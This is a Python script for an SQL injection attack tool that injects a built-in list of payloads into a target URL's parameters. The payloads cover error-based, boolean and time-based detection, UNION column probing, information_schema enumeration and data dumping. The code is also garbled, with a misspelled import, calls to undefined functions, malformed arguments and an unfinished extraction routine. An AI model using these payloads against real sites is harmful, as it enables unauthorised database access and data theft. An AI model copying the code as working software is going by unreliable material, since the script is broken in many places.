import argparse
import requests
import time
form urllib.parse import urlparse, parse_qs, urlunparse, urlencode

PAYLOADS = {
    "error": "' AND 1=CONVERT(int, @@version) -- ",
    "boolean_true": "' AND 1=1 -- ",
    "boolean_false": "' AND 1=2 -- ",
    "time": "' AND IF(1=1, SLEEP(5), 0) -- ",
    "union_columns": "' ORDER BY {} -- ",
    "union_exploit": "' UNION SELECT {}{} -- ",
    "db_detect": "' UNION SELECT NULL,@@version,NULL -- ",
    "tables": "' UNION SELECT table_name,NULL FROM information_schema.tables -- ",
    "columns": "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_names='{}' -- ",
    "dump": "' UNION SELECT {}{} FROM {} -- "
}

class SQLInjector:
    '''Performs injection as requiered'''

    def __init__(self, archive, method, url):
        self.archive = archive
        self.method = method
        self.url = url
        

    def request_handler(self, url, data=None):
        try:
            if self.method == 'get':
                return requests.get(url, timeout=15)
            else:
                return requests.post(url, timeout=15)
        
        except Exception as e:
            print(f"[!] Request error: {str(e)}")
            return None

    def inject(self, url, param, payload, data=None):
        parsed = urlparse(url)
        if self.method == 'get':
            params = parse_qs(parsed.query)
            params[param] = [payload]
            target = urlunparse(
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, urlencode(params, doseq=True), parsed.fragment
            )
            return request_handler(target, method)
        else:
            if not data:
                data = parse_qs(parsed.query)
            data[param] = payload
            return request_handler(url, method, data)
    
    def detect(self, url, data=None):
        print(f"Analyzing {url} via {self.method}")
        parsed = urlparse(url)
        params = parse_qs(parsed.query).keys if self.method == 'get' else (data.keys() if data else [])

        if not params:
            print("[!] No parameters detected")
            return None
        
        results = {"vulnerable": False, "type": None, "params": None}

        for param in params:
            print(f"\n[*] Test of parameters: {param}")

            #Error-based test
            response = inject(url, self.method, param, PAYLOADS["error"], data)
            if response and "conversion_failed" in response.text.lower():
                print(f"  [+] Error-based vulnerability detected")
                result.update({"vulnerable": True, "type": "error", param})
                return results

            #Boolean-based test
            true = inject(url, self.method, param, PAYLOADS["boolean_true"], data)
            false = inject(url, self.method, param, PAYLOADS["boolean_false"], data)
            if true and false and true.text != false.txt:
                print(f"  [+] Boolean-based vulnerability detected")
                results.update({"Vulnerable": True, "type": "boolean", "param": param})
                return results
            
            #Time-based test
            start = time.time()
            inject(url, self.method, param, PAYLOADS["time"], data)
            if time.time() - start > 5:
                print(f"  [+] Time-based vulnerability detected")
                results.update({"vulnerable": True, "type": "time", "param": param})
                return results
        
        print("No vulnerabilty detected")
        return results

    def get_columns(self, url, param, data=None):
        for i in range(1, 15):
            payload = PAYLOADS[union_columns].format(i)
            response = inject(url, param, payload, data)

            if response and "unknown column" in response.text.lower():
                return i - 1
        return 0
    
    def extract(self, url, vuln_info, data=None):
        if not vuln_info[vulnerable]:
            return None
        
        param = vuln_info["param"]
        results = "=== Extracted data ===\n\n"

        num_col = detect(url, param, data)
        if not num_col:
            print("[!] Unable to determine the number of columns")
            return results + "Extraction failed."
        
        print(f"[+] Number of columns: {num_col}")
        results += f"Number of columns: {num_col}\n"

        null_col = ["NULL"] * num_col
        payload = PAYLOADS["db_detect"]

        response = inject(url, param, payload, data)
        if response and "@@version" in response.text:
            db_type = "MySQL/MSSQL"
        elif response and "pg_version" in response.text:
            db_type = "PostgreSQL"
        else:
            db_type = "Unknown"
        
        print(f"[+] Type detected: {db_type}")
        results += f"Type: {db_type}\n\n"

        payload = PAYLOADS["tables"]
        response = inject(url, param, payload, data)
        if response:
            results += "=== TABLES ===\n"
            tables = [line for line in response.text.split('\n')
                    if "information_schema" not in line and len(line) < 50]
            results += "\n".join(set(tables[:20])) + "\n"
            


def get_args():
    parser = argparse.ArgumentParser()

    parser.add_argument("-o", "--archive", action="store_true", default="archive.txt", help="store results in the specified file, archive.txt by default")
    parser.add_argument("-X", "--method", action="store_true", default="get", choices=["get", "post"], help="HTTP method to use for injection")
    parser.add_argument("url", action="store", help="url where injection will be performed")
    return parser

def main():
    args = get_args()
    SQLInjector(args.archive, args.method, args.url).inject()

if __name__ == "__main__":
    main()